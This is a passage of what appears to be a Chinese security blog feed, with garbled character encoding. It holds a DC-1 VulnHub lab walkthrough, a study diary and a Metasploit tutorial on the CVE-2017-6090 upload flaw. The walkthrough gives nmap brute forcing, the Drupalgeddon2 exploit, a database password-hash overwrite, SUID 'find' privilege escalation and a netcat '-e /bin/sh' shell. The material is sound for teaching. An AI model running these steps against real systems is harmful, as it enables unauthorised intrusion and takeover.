class="headerlink" title="åŸºç¡€ä¿¡æ¯æ”¶é›†"></a>åŸºç¡€ä¿¡æ¯æ”¶é›†</h2><h3 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h3><pre><code>nmap -A 192.168.124.0/24</code></pre><p>æ‰«æç»“æœ<br>å¼€å‘80ï¼Œ111ï¼Œ22sshç«¯å£</p><pre><code>Host is up (0.00039s latency).Not shown: 997 closed portsPORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)| ssh-hostkey: |   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)80/tcp  open  http    Apache httpd 2.2.22 ((Debian))|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.2.22 (Debian)|_http-title: Welcome to Drupal Site | Drupal Site111/tcp open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100024  1          37454/udp   status|   100024  1          39208/udp6  status|   100024  1          52048/tcp   status|_  100024  1          57763/tcp6  statusMAC Address: 00:0C:29:A6:59:A3 (VMware)Device type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux 3.2 - 3.16Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.39 ms 192.168.124.145</code></pre><h3 id="å…ˆçˆ†ç ´ä¸€ä¸‹sshå§-æ— ç»“æœ"><a href="#å…ˆçˆ†ç ´ä¸€ä¸‹sshå§-æ— ç»“æœ" class="headerlink" title="å…ˆçˆ†ç ´ä¸€ä¸‹sshå§(æ— ç»“æœ)"></a>å…ˆçˆ†ç ´ä¸€ä¸‹sshå§(æ— ç»“æœ)</h3><pre><code>nmap --script=ssh-brute 192.168.124.145</code></pre><p><img src="/images/pasted-107.png" alt="upload successful"></p><h3 id="è®¿é—®80ç«¯å£"><a href="#è®¿é—®80ç«¯å£" class="headerlink" title="è®¿é—®80ç«¯å£"></a>è®¿é—®80ç«¯å£</h3><p><img src="/images/pasted-108.png" alt="upload successful"><br>å°è¯•äº†æ³¨å†Œï¼Œç™»å½•çš„å¼±å¯†ç ï¼Œä¿®æ”¹å¯†ç ï¼Œæ— æ•ˆï¼Œä½†å‘ç°adminç”¨æˆ·å­˜åœ¨<br>wappalyzeræŒ‡çº¹è¯†åˆ«ï¼Œå‘ç°å®¤Drupalç³»ç»Ÿ<br><img src="/images/pasted-109.png" alt="upload successful"></p><h2 id="å»æ¼æ´åº“å’Œmsfæœç´¢ä¸€ä¸‹"><a href="#å»æ¼æ´åº“å’Œmsfæœç´¢ä¸€ä¸‹" class="headerlink" title="å»æ¼æ´åº“å’Œmsfæœç´¢ä¸€ä¸‹"></a>å»æ¼æ´åº“å’Œmsfæœç´¢ä¸€ä¸‹</h2><pre><code>msfconsolesearch Drupal</code></pre><p><img src="/images/pasted-110.png" alt="upload successful"></p><p><img src="/images/pasted-111.png" alt="upload successful"><br>å‘ç°æœ‰æ¼æ´å¯ä»¥ç”¨é‚£å°±å¼€å§‹msfå§<br>ä½¿ç”¨2018å¹´çš„æ¼æ´å§ï¼Œæ˜¯ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œ(ä»£ç å®¡è®¡ç°åœ¨çœŸå¿ƒçœ‹ä¸æ‡‚ï¼ŒğŸ˜”)<br><a href="https://www.exploit-db.com/exploits/44482" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44482</a><br><a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">https://paper.seebug.org/567/</a><br><img src="/images/pasted-112.png" alt="upload successful"></p><h3 id="msfå‘ç°è¿æ¥æˆåŠŸ"><a href="#msfå‘ç°è¿æ¥æˆåŠŸ" class="headerlink" title="msfå‘ç°è¿æ¥æˆåŠŸ"></a>msfå‘ç°è¿æ¥æˆåŠŸ</h3><pre><code>use exploit/unix/webapp/drupal_drupalgeddon2set RHOSTS 192.168.124.145run</code></pre><p><img src="/images/pasted-113.png" alt="upload successful"></p><h2 id="å¯»æ‰¾ä¸€ä¸‹flag"><a href="#å¯»æ‰¾ä¸€ä¸‹flag" class="headerlink" title="å¯»æ‰¾ä¸€ä¸‹flag"></a>å¯»æ‰¾ä¸€ä¸‹flag</h2><pre><code>shellfind / -name flag*</code></pre><p><img src="/images/pasted-114.png" alt="upload successful"></p><pre><code>/home/flag4/home/flag4/flag4.txt/var/www/flag1.txt</code></pre><p>æ‰“å¼€flag1.txtè¯•è¯•</p><pre><code>cat /var/www/flag1.txt</code></pre><p><img src="/images/pasted-115.png" alt="upload successful"><br>ç¿»è¯‘ä¸€ä¸‹:æ¯ä¸€ä¸ªå¥½çš„CMSéƒ½éœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶â€“ä½ ä¹Ÿä¸€æ ·ã€‚<br>æœç´¢Drupalçš„é…ç½®æ–‡ä»¶<br>/var/www/sites/default/settings.phpï¼Œæ‰“å¼€</p><pre><code>cat /var/www/sites/default/settings.php</code></pre><pre><code>* * flag2 * Brute force and dictionary attacks aren&#39;t the * only ways to gain access (and you WILL need access). * What can you do with these credentials? * */$databases = array (  &#39;default&#39; =&gt;   array (    &#39;default&#39; =&gt;     array (      &#39;database&#39; =&gt; &#39;drupaldb&#39;,      &#39;username&#39; =&gt; &#39;dbuser&#39;,      &#39;password&#39; =&gt; &#39;R0ck3t&#39;,      &#39;host&#39; =&gt; &#39;localhost&#39;,      &#39;port&#39; =&gt; &#39;&#39;,      &#39;driver&#39; =&gt; &#39;mysql&#39;,      &#39;prefix&#39; =&gt; &#39;&#39;,    ),  ),);</code></pre><h2 id="å‘ç°äº†flag2å’Œæ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œå°è¯•è¿æ¥ä¸€ä¸‹"><a href="#å‘ç°äº†flag2å’Œæ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œå°è¯•è¿æ¥ä¸€ä¸‹" class="headerlink" title="å‘ç°äº†flag2å’Œæ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œå°è¯•è¿æ¥ä¸€ä¸‹"></a>å‘ç°äº†flag2å’Œæ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œå°è¯•è¿æ¥ä¸€ä¸‹</h2><p>å…ˆå¼„ä¸€ä¸‹äº¤äº’shellå§</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/images/pasted-117.png" alt="upload successful"><br>è¿æ¥æ•°æ®åº“å°è¯•ä¸€ä¸‹</p><pre><code>mysql -u dbuser -p R0ck3t</code></pre><h2 id="æŸ¥çœ‹ä¸€ä¸‹nodeå’Œuserè¡¨ï¼Œå‘ç°flag3"><a href="#æŸ¥çœ‹ä¸€ä¸‹nodeå’Œuserè¡¨ï¼Œå‘ç°flag3" class="headerlink" title="æŸ¥çœ‹ä¸€ä¸‹nodeå’Œuserè¡¨ï¼Œå‘ç°flag3"></a>æŸ¥çœ‹ä¸€ä¸‹nodeå’Œuserè¡¨ï¼Œå‘ç°flag3</h2><pre><code>select * from node;select * from users;</code></pre><p><img src="/images/pasted-118.png" alt="upload successful"><br>ä¸ºä»€ä¹ˆè¦çœ‹nodeè¡¨å‘¢ï¼Ÿï¼Ÿï¼Ÿ(userè¡¨å°±ä¸è¯´äº†å§)<br>å› ä¸ºdrupal nodeæœºåˆ¶<br><a href="https://www.cnblogs.com/amw863/p/4551889.html" target="_blank" rel="noopener">drupal nodeæœºåˆ¶ç†è§£</a><br>soï¼Œå°è¯•è·å¾—ç™»å½•çš„å¯†ç ï¼Œhashå€¼ç ´è§£å¯èƒ½ä¸å¤ªç°å®<br>æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªè´¦å·å°†äºŒè€…hashäº’æ¢ä¸å°±å¯ä»¥äº†<br>æˆ‘ä¸¢ä¸è¡Œï¼Œæ³¨å†Œæ²¡æ³•å†™å¯†ç ï¼Œ<br>é‚£æ‰¾åˆ°åŠ å¯†è„šæœ¬è‡ªå·±åŠ å¯†ä¸€ä¸ªä¸å°±è¡Œäº†<br>åŠ å¯†è„šæœ¬ä½ç½®</p><p>scripts/password-hash.sh<br><img src="/images/pasted-119.png" alt="upload successful"></p><pre><code>php scripts/password-hash.sh adminpassword: admin                 hash: $S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.</code></pre><p>å°è¯•æ›´æ¢ç®¡ç†å‘˜å¯†ç çš„hash</p><pre><code>update users set pass=&#39;$S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.&#39; where name=&#39;admin&#39;;</code></pre><p><img src="/images/pasted-120.png" alt="upload successful"><br>ä¸‹é¢ç™»å½•æµ‹è¯•ä¸€ä¸‹,è´¦å·adminå¯†ç admin<br><img src="/images/pasted-121.png" alt="upload successful"><br>åœ¨contentä¸­å‘ç°<br><img src="/images/pasted-122.png" alt="upload successful"><br>Special PERMS will help FIND the passwd - but youâ€™ll need to -exec that command to work out how to get whatâ€™s in the shadow.</p><h2 id="ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦å¯»æ‰¾å¯†ç ï¼Œè€Œä¸”æç¤ºshadowï¼Œä¹‹å‰çš„flag4è¿˜æ²¡çœ‹"><a href="#ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦å¯»æ‰¾å¯†ç ï¼Œè€Œä¸”æç¤ºshadowï¼Œä¹‹å‰çš„flag4è¿˜æ²¡çœ‹" class="headerlink" title="ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦å¯»æ‰¾å¯†ç ï¼Œè€Œä¸”æç¤ºshadowï¼Œä¹‹å‰çš„flag4è¿˜æ²¡çœ‹"></a>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦å¯»æ‰¾å¯†ç ï¼Œè€Œä¸”æç¤ºshadowï¼Œä¹‹å‰çš„flag4è¿˜æ²¡çœ‹</h2><p><img src="/images/pasted-123.png" alt="upload successful"><br>Can you use this same method to find or access the flag in root?<br>Probably. But perhaps itâ€™s not that easy.  Or maybe it is?<br>åº”è¯¥æ˜¯è®©è·å¾—ç®¡ç†å‘˜æƒé™ï¼Œå†å»/etc/shadowçœ‹çœ‹</p><p><img src="/images/pasted-124.png" alt="upload successful"><br>å°è¯•ç»™æƒé™ï¼Œè¿˜æ˜¯ä¸è¡Œ<br><img src="/images/pasted-125.png" alt="upload successful"><br>é‚£åªèƒ½å°è¯•ææƒäº†</p><h2 id="suidææƒ"><a href="#suidææƒ" class="headerlink" title="suidææƒ"></a>suidææƒ</h2><p>SUIDæ˜¯set uidçš„ç®€ç§°ï¼Œå®ƒå‡ºç°åœ¨æ–‡ä»¶æ‰€å±ä¸»æƒé™çš„æ‰§è¡Œä½ä¸Šé¢ï¼Œæ ‡å¿—ä¸º s ã€‚å½“è®¾ç½®äº†SUIDåï¼ŒUMSKç¬¬ä¸€ä½ä¸º4ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œæˆ‘ä»¬è´¦æˆ·çš„å¯†ç æ–‡ä»¶å­˜æ”¾åœ¨/etc/shadowä¸­ï¼Œè€Œ/etc/shadowçš„æƒé™ä¸º â€”â€”â€”-ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šåªæœ‰rootç”¨æˆ·å¯ä»¥å¯¹è¯¥ç›®å½•è¿›è¡Œæ“ä½œï¼Œè€Œå…¶ä»–ç”¨æˆ·è¿æŸ¥çœ‹çš„æƒé™éƒ½æ²¡æœ‰ã€‚å½“æ™®é€šç”¨æˆ·è¦ä¿®æ”¹è‡ªå·±çš„å¯†ç çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨passwdè¿™ä¸ªæŒ‡ä»¤ã€‚passwdè¿™ä¸ªæŒ‡ä»¤åœ¨/bin/passwdä¸‹ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œè¿™ä¸ªå‘½ä»¤åï¼Œå°±å¯ä»¥ä¿®æ”¹/etc/shadowä¸‹çš„å¯†ç äº†ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡passwdè¿™ä¸ªæŒ‡ä»¤å»ä¿®æ”¹ä¸€ä¸ªæˆ‘ä»¬æ²¡æœ‰æƒé™çš„æ–‡ä»¶å‘¢ï¼Ÿè¿™é‡Œå°±ç”¨åˆ°äº†suidï¼Œsuidçš„ä½œç”¨æ˜¯è®©æ‰§è¡Œè¯¥å‘½ä»¤çš„ç”¨æˆ·ä»¥è¯¥å‘½ä»¤æ‹¥æœ‰è€…å³rootçš„æƒé™å»æ‰§è¡Œï¼Œæ„æ€æ˜¯å½“æ™®é€šç”¨æˆ·æ‰§è¡Œpasswdæ—¶ä¼šæ‹¥æœ‰rootçš„æƒé™ï¼Œè¿™æ ·å°±å¯ä»¥ä¿®æ”¹/etc/passwdè¿™ä¸ªæ–‡ä»¶äº†ã€‚<br>å‚è€ƒæ–‡ç« :<a href="https://blog.csdn.net/qq_36119192/article/details/82228791#Umask%E3%80%81Suid%E3%80%81Sgid%E3%80%81%E7%B2%98%E6%BB%9E%E4%BD%8D" target="_blank" rel="noopener">Linuxä¸‹çš„ç”¨æˆ·ã€ç»„å’Œæƒé™</a><br>å·²çŸ¥çš„å¯ç”¨æ¥ææƒçš„linuxå¯è¡Œæ€§çš„æ–‡ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š<br>nmap,vim,find,bash,more,less,nano,cp<br>å‘ç°ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶</p><pre><code>ä¸åŒç³»ç»Ÿé€‚ç”¨äºä¸åŒçš„å‘½ä»¤find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000-print2&gt;/dev/nullfind / -user root -perm -4000-exec ls -ldb {} \;</code></pre><p><img src="/images/pasted-126.png" alt="upload successful"><br>å°è¯•æŸ¥çœ‹findæ˜¯å¦æœ‰suidæƒé™</p><pre><code>/usr/bin/find /tmp -exec whoami  \;</code></pre><p>find å‘½ä»¤è¯´æ˜<br>-exec å‚æ•°åé¢è·Ÿçš„æ˜¯commandå‘½ä»¤ï¼Œå®ƒçš„ç»ˆæ­¢æ˜¯ä»¥;ä¸ºç»“æŸæ ‡å¿—çš„ï¼Œæ‰€ä»¥è¿™å¥å‘½ä»¤åé¢çš„åˆ†å·æ˜¯ä¸å¯ç¼ºå°‘çš„ï¼Œè€ƒè™‘åˆ°å„ä¸ªç³»ç»Ÿä¸­åˆ†å·ä¼šæœ‰ä¸åŒçš„æ„ä¹‰ï¼Œæ‰€ä»¥å‰é¢åŠ åæ–œæ ã€‚-execå‚æ•°åé¢è·Ÿçš„å°±æ˜¯æˆ‘ä»¬æƒ³è¿›ä¸€æ­¥æ“ä½œçš„å‘½ä»¤,soï¼Œæˆ‘ä»¬å¯ä»¥ä»¥rootçš„æƒé™å‘½ä»¤æ‰§è¡Œäº†</p><p>åå¼¹ä¸€ä¸ªshellï¼Œå½“ç„¶findå’Œæ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è¿”å›ä¸€ä¸ªrootçš„netcatçš„åé—¨</p><pre><code>/usr/bin/find ./aaa -exec &#39;/bin/sh&#39;  \;</code></pre><pre><code>/usr/bin/find ./aaa -exec netcat -lvp 4444 -e &quot;/bin/sh&quot; \;netcat 192.168.124.145 4444</code></pre><p><img src="/images/pasted-127.png" alt="upload successful"><br><img src="/images/pasted-135.png" alt="upload successful"><br>æœ€å,è·å¾—æœ€åä¸€ä¸ªflag</p><pre><code>cat thefinalflag.txt</code></pre><p>Well done!!!!</p><p>Hopefully youâ€™ve enjoyed this and learned some new skills.</p><p>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p>freebuf:<a href="https://www.freebuf.com/articles/network/218073.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/218073.html</a><br>çŸ¥ä¹:<a href="https://zhuanlan.zhihu.com/p/135342104" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/135342104</a><br>W3:<a href="https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640" target="_blank" rel="noopener">https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ å®‰å…¨ä¸€å¹´æ€»ç»“</title>
      <link href="/posts/ba80.html"/>
      <url>/posts/ba80.html</url>
      
        <content type="html"><![CDATA[<h2 id="è¿½å¯»"><a href="#è¿½å¯»" class="headerlink" title="è¿½å¯»"></a>è¿½å¯»</h2><p>æ„Ÿè§‰é»‘é˜”å¾ˆé…·ï¼Œå¿—æ„¿ä¸­æŠ¥è€ƒäº†ç±»ä¼¼ç½‘ç»œå®‰å…¨çš„ä¸“ä¸šï¼Œå¾ˆè£å¹¸è¢«å½•å–ï¼Œç„¶ååœ¨å­¦é•¿æ¨èä¸‹åŠ å…¥äº†æ ¡ctfå·¥ä½œå®¤å­¦ä¹ (æ„Ÿè°¢å·¥ä½œå®¤å­¦é•¿ä»¬æ¨èå’ŒæŒ‡ç‚¹)</p><h2 id="æ‰§ç€"><a href="#æ‰§ç€" class="headerlink" title="æ‰§ç€"></a>æ‰§ç€</h2><p>ç„¶ååœ¨å­¦é•¿ä»¬æ•™å¯¼ä¸‹å­¦ä¹ webå®‰å…¨:<br>cï¼Œc++ï¼Œphpï¼ŒPython                  â€”å­¦æ ¡åŸºç¡€è¯¾ï¼Œä¹Ÿå°±ä¼šæ•²ä¸ªæˆç»©ç®¡ç†ç³»ç»Ÿï¼Œç•™è¨€æ¿ï¼Œæœ€æœ€åŸºç¡€çˆ¬è™«ï¼Œå’Œæ²¡æœ‰ç”¨çš„Pygameå°æ¸¸æˆ(åƒä¸‡åˆ«å­¦!!!)<br>DVWA<br>sql-labs                              â€”æ‰‹æ³¨ä¸€é(å¿˜çš„ä¹ŸæŸ¥ä¸å¤šäº†)ï¼Œsqlmapè¿˜æ²¡å­¦<br>upload-labs                       â€”è¿‡äº†ä¸€é<br>xss-labs                            â€”è¿‡äº†ä¸€é(beefæ²¡å­¦)<br>æ–‡ä»¶åŒ…å«phpä¼ªåè®®<br>phpçš„ååºåˆ—åŒ–ï¼Œä¸»è¦æ˜¯å¯¹äºctfçš„(ç©äº†ä¸€æ®µctf)<br>å·¥å…·msfï¼Œnmap(çœ‹äº†ä¸€å“ˆå››èˆäº”å…¥ç­‰äºæ²¡å­¦)<br>wifiçš„å…¥ä¾µ                        â€”çœ‹äº†ä¸€æœ¬ä¹¦ï¼Œå…¶å®ä¹Ÿåªæ˜¯ä½¿ç”¨å·¥å…·</p><h2 id="å±•æœ›å’Œæ€è€ƒ"><a href="#å±•æœ›å’Œæ€è€ƒ" class="headerlink" title="å±•æœ›å’Œæ€è€ƒ"></a>å±•æœ›å’Œæ€è€ƒ</h2><p>è™½ç„¶åœ¨å­¦é•¿ä»¬çš„æŒ‡å¯¼ä¸‹ï¼Œä½†å­¦ä¹ ç½‘ç»œå®‰å…¨ä¸­ä¹Ÿæµªè´¹äº†è›®å¤šçš„æ—¶é—´(å…³é”®æˆ‘å–œæ¬¢çæŠ˜è…¾ï¼Œä¸è¿‡æ˜¯çœŸæœ‰è¶£)ï¼Œæ¯”å¦‚qqæœºå™¨äººï¼Œpygameï¼Œè¿˜æœ‰è¿™ä¸ªåšå®¢ï¼Œéƒ½æäº†è›®ä¹…çš„å…¶å®ã€‚æ„Ÿè§‰æ¥ä¸‹æ¥åº”è¯¥æŠŠæ—¶é—´æ”¾åœ¨æ›´æœ‰æ„ä¹‰çš„äº‹æƒ…ä¸Šï¼Œè¿˜æœ‰ä¸€ä¸ªé”™è¯¯çš„è®¤è¯†ï¼Œä¹‹å‰æƒ³ç€è¦æŠŠä¸œè¥¿éƒ½å­¦å®Œå†æ“ä½œï¼Œå…¶å®ä¸æ˜¯çš„ï¼Œç½‘ç»œå®‰å…¨æ›´æ³¨é‡å®æ“(è¿™ä¸ªç‰¹åˆ«æ„Ÿè°¢å­¦é•¿çš„æŒ‡ç‚¹ï¼Œä¸ç„¶å¯èƒ½è¿˜èƒ½è¦èµ°æ›´è¿œçš„å¼¯è·¯)<br>åç»­å­¦ä¹ å°è®¡åˆ’:<br>æ‰“æ‰“vulnhub<br>ç»§ç»­å­¦ä¹ å¸¸è§æ¼æ´<br>å­¦ä¹ ä»£ç å®¡è®¡<br>å­¦ä¹ å†…ç½‘ç›¸å…³çŸ¥è¯†<br>å­¦ä¹ è„šæœ¬è¯­è¨€Python<br>sqlmapç­‰å·¥å…·ï¼Œä¹Ÿå°è¯•è‡ªå·±å†™ç‚¹å°å·¥å…·(å°½åŠ›å§!?)<br>å¸Œæœ›å†ä¸€å¹´åçœ‹åˆ°åšå®¢çš„è‡ªå·±æœ‰æ‰€è¿›æ­¥ï¼Œæœ€åï¼Œç‰¹åˆ«æ„Ÿè°¢å·¥ä½œå®¤å­¦é•¿å­¦å§æŒ‡ç‚¹æ•™å¯¼ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ä¸ªäººæ—¥å¸¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ—¥è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msfçš„åŸºæœ¬ä½¿ç”¨(ä¸€)</title>
      <link href="/posts/84b8.html"/>
      <url>/posts/84b8.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ¸—é€ç¯å¢ƒçš„æ­å»º"><a href="#æ¸—é€ç¯å¢ƒçš„æ­å»º" class="headerlink" title="æ¸—é€ç¯å¢ƒçš„æ­å»º"></a>æ¸—é€ç¯å¢ƒçš„æ­å»º</h2><p>phpcollabçš„ä¸‹è½½:<a href="https://files.cnblogs.com/files/Lmg66/phpCollab-v2.5.1.zip" target="_blank" rel="noopener">phpCollab-v2.5.1.zip</a><br>è§£å‹åˆ°wwwç›®å½•,ç»™wwwç›®å½•æƒé™ï¼Œå› ä¸ºè¿™ä¸ªæ¼æ´éœ€è¦å†™çš„æƒé™<br><code>chmod 777 wwww</code></p><p>åŸºæœ¬ç¯å¢ƒ<br><img src="/images/pasted-100.png" alt="upload successful"></p><p>é…ç½®</p><p><code>mysql -u root -p                 ---è¿›å…¥æ•°æ®åº“</code></p><p><code>create database msf               ---åˆ›å»ºæ•°æ®åº“åç§°ä¸ºmsfè‡ªå·±å¯ä»¥æ”¹</code></p><p>è¿›å…¥é¡µé¢ä¸‹æ‹‰ï¼Œç‚¹ä¸Šå¯¹å‹¾ï¼Œç‚¹settingï¼Œè¿›å…¥è®¾ç½®é¡µé¢</p><p><img src="/images/pasted-101.png" alt="upload successful"><br>å¦‚æœå‘å‡ºæŠ¥é”™æé†’ï¼Œsetting.phpæ²¡æœ‰å†™çš„æƒé™ï¼Œå°è¯•åˆ°includingsæ–‡ä»¶å¤¹ä¸­åˆ›å»ºsettings.phpç„¶åè®©ä»–çš„æƒé™ä¸º777ï¼Œåœ¨é‡æ–°é…ç½®ã€‚</p><h2 id="CVE-2017-6090åŸºæœ¬åŸç†"><a href="#CVE-2017-6090åŸºæœ¬åŸç†" class="headerlink" title="CVE-2017-6090åŸºæœ¬åŸç†"></a>CVE-2017-6090åŸºæœ¬åŸç†</h2><p>æ–‡ä»¶ä¸Šä¼ ï¼Œæ¼æ´ç‚¹ï¼š<br>/phpcollab/clients/editclient.phpæ–‡ä»¶çš„ç¬¬63~70è¡Œ</p><pre><code>$extension = strtolower( substr( strrchr($_FILES[&#39;upload&#39;][&#39;name&#39;], &quot;.&quot;) ,1) );        if(@move_uploaded_file($_FILES[&#39;upload&#39;][&#39;tmp_name&#39;], &quot;../logos_clients/&quot;.$id.&quot;.$extension&quot;))         {            chmod(&quot;../logos_clients/&quot;.$id.&quot;.$extension&quot;,0666);            $tmpquery = &quot;UPDATE &quot;.$tableCollab[&quot;organizations&quot;].&quot; SET extension_logo=&#39;$extension&#39; WHERE id=&#39;$id&#39;&quot;;            connectSql(&quot;$tmpquery&quot;);        }</code></pre><p>$extension = strtolower( substr( strrchr($_FILES[â€˜uploadâ€™][â€˜nameâ€™], â€œ.â€) ,1) );è¿™é‡Œè·å¾—äº†å°å†™çš„æ–‡ä»¶åç¼€åæ²¡æœ‰ç»è¿‡è¿‡æ»¤<br>move_uploaded_file($_FILES[â€˜uploadâ€™][â€˜tmp_nameâ€™], â€œ../logos_clients/â€œ.$id.â€.$extensionâ€)ä¸­ç›´æ¥id+åç¼€ä½¿ç”¨<br>æ‰€æœ‰æˆ‘ä»¬å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶ï¼Œä¹Ÿä¸ä¼šè¢«æ›´æ”¹åç¼€åï¼Œç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œèšå‰‘è¿æ¥ï¼ŒåŸç†å¾ˆç®€å•</p><p><img src="/images/pasted-102.png" alt="upload successful"></p><p><img src="/images/pasted-103.png" alt="upload successful"></p><h2 id="msfçš„åŸºæœ¬å‘½ä»¤"><a href="#msfçš„åŸºæœ¬å‘½ä»¤" class="headerlink" title="msfçš„åŸºæœ¬å‘½ä»¤"></a>msfçš„åŸºæœ¬å‘½ä»¤</h2><p><img src="/images/pasted-104.png" alt="upload successful"><br>msfconsoleçš„è¿æ¥shellåçš„å‘½ä»¤</p><p><img src="/images/pasted-105.png" alt="upload successful"></p><h2 id="msfçš„åŸºæœ¬ä½¿ç”¨-CVE-2017-6090"><a href="#msfçš„åŸºæœ¬ä½¿ç”¨-CVE-2017-6090" class="headerlink" title="msfçš„åŸºæœ¬ä½¿ç”¨(CVE-2017-6090)"></a>msfçš„åŸºæœ¬ä½¿ç”¨(CVE-2017-6090)</h2><p>åˆå§‹åŒ–å¹¶å¯åŠ¨msfçš„æ•°æ®åº“</p><pre><code>msfdb initmsfdb start</code></pre><p>msfconsoleçš„æ•°æ®åº“çš„å‘½ä»¤</p><pre><code>msfdb init      å¯åŠ¨å¹¶åˆå§‹åŒ–æ•°æ®åº“msfdb reinit       åˆ é™¤å¹¶é‡æ–°åˆå§‹åŒ–æ•°æ®åº“msfdb delete      åˆ é™¤æ•°æ®åº“å¹¶åœæ­¢ä½¿ç”¨msfdb start        å¯åŠ¨æ•°æ®åº“msfdb stop        åœæ­¢æ•°æ®åº“msfdb status      æ£€æŸ¥æœåŠ¡çŠ¶æ€msfdb run         å¯åŠ¨æ•°æ®åº“å¹¶è¿è¡Œmsf</code></pre><p>å»ºç«‹ä¸€æ¬¡æ‰«æ(CVE-2017-6090)</p><p><img src="/images/pasted-106.png" alt="upload successful"></p><h2 id="å‚è€ƒæ–‡ç« åŠè¯´æ˜"><a href="#å‚è€ƒæ–‡ç« åŠè¯´æ˜" class="headerlink" title="å‚è€ƒæ–‡ç« åŠè¯´æ˜"></a>å‚è€ƒæ–‡ç« åŠè¯´æ˜</h2><p>ã€Šç²¾é€šmetasploiteæ¸—é€æµ‹è¯•(ç¬¬3ç‰ˆ)ã€‹<br>è¯´æ˜ï¼šæœ¬æ–‡ä»…é™æŠ€æœ¯ç ”ç©¶ä¸è®¨è®ºï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™äº§ç”Ÿçš„ä¸€åˆ‡åæœè‡ªè¡Œæ‰¿æ‹…</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>netcatçš„ä½¿ç”¨</title>
      <link href="/posts/f724.html"/>
      <url>/posts/f724.html</url>
      
